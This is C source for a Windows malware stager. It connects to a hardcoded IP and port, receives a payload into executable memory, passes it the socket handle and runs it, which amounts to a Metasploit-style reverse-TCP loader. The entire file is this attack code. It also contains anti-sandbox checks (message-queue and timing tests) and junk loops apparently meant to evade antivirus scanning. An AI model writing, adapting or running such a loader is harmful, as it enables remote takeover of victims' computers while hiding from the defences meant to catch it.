#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <string.h>

void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}
void Kick(SOCKET my_socket, char * error) {
	printf("error: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}



int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;
		if (nret == SOCKET_ERROR)
			Kick(my_socket, "Could not receive data");
	}
	return tret;
}



SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		Kick(my_socket, "Can't initialize socket");
	target = gethostbyname(targetip);
	if (target == NULL)
		Kick(my_socket, "can't resolve target");
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		Kick(my_socket, "Could not connect");
	return my_socket;
}


int random_in_range (unsigned int min, unsigned int max)
{
  int base_random = rand(); /* in [0, RAND_MAX] */
  if (RAND_MAX == base_random) return random_in_range(min, max);
  /* now guaranteed to be in [0, RAND_MAX) */
  int range       = max - min,
      remainder   = RAND_MAX % range,
      bucket      = RAND_MAX / range;
  /* There are range buckets, plus one smaller interval
     within remainder of RAND_MAX */
  if (base_random < RAND_MAX - remainder) {
    return min + base_random/bucket;
  } else {
    return random_in_range (min, max);
  }
}

char* rev(char* str)
{
  int end=strlen(str)-1;
  int start = 5;

  while( start<end )
  {
    str[start] ^= 1;
    ++start;
  }

  return str;
}


int main(int argc) {
	ULONG32 size;
	char * buffer;
	void (*function)();
	winsock_init();
	char argv[3][25];
	int num1, num2, num3;

	strcpy(argv[1],"10.1.225.101");
	strcpy(argv[2],"4445");

	MSG msg;
	DWORD tc;
	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
		return 0;
	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
		return 0;
	tc = GetTickCount();
	Sleep(650);
	if (((GetTickCount() - tc) / 300) != 2)
		return 0;

	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		Kick(my_socket, "bad length value\n");

	while (num1<=5) {
		num1=random_in_range(0,10000);
		num2=random_in_range(0,10000);
   		num3=random_in_range(0,10000);
	}
	num1=0;
	
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	while (num1<=5) {
		num1=random_in_range(0,10000);
		num2=random_in_range(0,10000);
   		num3=random_in_range(0,10000);
	}
	num1=0;
	if (buffer == NULL)
		Kick(my_socket, "bad buffer\n");
	buffer[0] = 0xBF;
	
	while (num1<=5) {
		num1=random_in_range(0,10000);
		num2=random_in_range(0,10000);
   		num3=random_in_range(0,10000);
	}
	num1=0;
	memcpy(buffer + 1, &my_socket, 4);
	while (num1<=5) {
		num1=random_in_range(0,10000);
		num2=random_in_range(0,10000);
   		num3=random_in_range(0,10000);
	}
	num1=0;
	count = recv_all(my_socket, buffer + 5, size);
	function = (void (*)())buffer;
	function();
	return 0;
}